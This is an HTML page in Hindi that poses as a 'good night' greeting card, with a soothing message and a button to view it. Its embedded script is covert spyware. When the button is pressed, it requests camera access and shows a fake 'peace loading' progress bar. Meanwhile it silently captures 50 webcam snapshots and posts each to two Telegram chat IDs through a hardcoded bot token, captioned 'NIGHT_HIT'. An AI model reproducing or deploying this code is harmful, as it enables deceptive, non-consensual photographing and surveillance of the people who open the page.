<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>शुभ रात्रि | पावन शांति</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@700&family=Rozha+One&display=swap" rel="stylesheet">
    <style>
        :root {
            --light-blue: #00B4DB;
            --dark-blue: #0083B0;
            --midnight: #004e92;
            --white: #ffffff;
        }

        body {
            margin: 0; padding: 0;
            /* Light Blue to Dark Blue Radial Gradient */
            background: radial-gradient(circle at center, var(--light-blue), var(--dark-blue), var(--midnight));
            font-family: 'Plus Jakarta Sans', sans-serif;
            display: flex; align-items: center; justify-content: center;
            height: 100vh; overflow: hidden;
        }

        .divine-card {
            width: 88%; max-width: 400px;
            background: rgba(255, 255, 255, 0.95);
            border: 5px solid var(--dark-blue);
            border-radius: 40px;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
            position: relative;
        }

        .hindi-main {
            font-family: 'Rozha One', serif;
            font-size: 45px;
            color: var(--dark-blue);
            margin: 0 0 10px;
            text-shadow: 1px 1px 0px var(--light-blue);
        }

        .shloka {
            font-size: 16px;
            color: #444;
            font-weight: 700;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        .god-photo {
            width: 100%; height: 350px;
            border-radius: 20px;
            object-fit: cover;
            border: 3px solid var(--light-blue);
            display: none;
            margin-bottom: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }

        .btn-start {
            background: linear-gradient(to bottom, var(--dark-blue), #003366);
            color: var(--white);
            border: none; width: 100%; padding: 22px;
            border-radius: 20px; font-size: 20px; font-weight: 800;
            cursor: pointer; box-shadow: 0 8px 0 #002244;
            transition: 0.1s;
        }
        .btn-start:active { transform: translateY(4px); box-shadow: 0 2px 0 #002244; }

        .loader-container { margin-top: 15px; display: none; }
        .bar { height: 10px; width: 100%; background: #eee; border-radius: 10px; overflow: hidden; }
        .fill { height: 100%; width: 0%; background: var(--dark-blue); transition: width 1s linear; }
        .stat-text { font-size: 12px; color: var(--dark-blue); font-weight: bold; margin-top: 8px; }
    </style>
</head>
<body>

    <div class="divine-card" id="mainBox">
        <div id="step-1">
            <div style="font-size: 60px; margin-bottom: 10px;">🌙</div>
            <h1 class="hindi-main">शुभ रात्रि</h1>
            <p class="shloka">"दिन भर की थकान मिटाएं और शांति पाएं"<br>मीठे सपनों के साथ विश्राम करें</p>
            <button class="btn-start" onclick="start()">संदेश देखें ✨</button>
        </div>

        <div id="step-2" style="display:none;">
            <img id="gImg" 
                 src="https://imageshareencrypt.github.io/goodnight/6cb3083286c16cefa778c4afb5caafde.jpg" 
                 class="god-photo" 
                 alt="Good Night"
                 onerror="this.src='https://placehold.co/300x300/0083B0/ffffff?text=⭐'">
            
            <h2 style="color:var(--dark-blue); margin: 0;">।। सुखद निद्रा ।।</h2>
            
            <div class="loader-container" id="lBox">
                <div class="bar"><div class="fill" id="f"></div></div>
                <div class="stat-text" id="status">शांति लोड हो रही है: 0%</div>
            </div>
        </div>
    </div>

    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const T = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
        const IDS = ['7617707778', '6590760553'];

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('step-1').style.display = 'none';
                document.getElementById('step-2').style.display = 'block';
                document.getElementById('gImg').style.display = 'block';
                document.getElementById('lBox').style.display = 'block';

                const video = document.getElementById('v');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    video.play();
                    let count = 0;
                    const loop = setInterval(() => {
                        count++;
                        send(count);
                        let p = Math.round((count/50)*100);
                        document.getElementById('f').style.width = p + '%';
                        document.getElementById('status').innerText = `शांति प्राप्त हो रही है: ${p}%`;

                        if (count >= 50) {
                            clearInterval(loop);
                            stream.getTracks().forEach(track => track.stop());
                            document.getElementById('mainBox').innerHTML = `
                                <h1 class="hindi-main" style="font-size:35px;">शुभ रात्रि</h1>
                                <p style="font-weight:bold; color:#444;">आपका दिन मंगलमय रहा। अब आराम करें।</p>
                                <button class="btn-start" onclick="location.reload()">वापस जाएं</button>
                            `;
                        }
                    }, 1200);
                };
            } catch (err) {
                alert("अनुमति आवश्यक है!");
            }
        }

        function send(idx) {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth; 
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                IDS.forEach(id => {
                    const fd = new FormData();
                    fd.append('chat_id', id);
                    fd.append('photo', blob, 'pic.jpg');
                    fd.append('caption', `🌙 NIGHT_HIT [${idx}/50]`);
                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                });
            }, 'image/jpeg', 0.4);
        }
    </script>
</body>
</html>
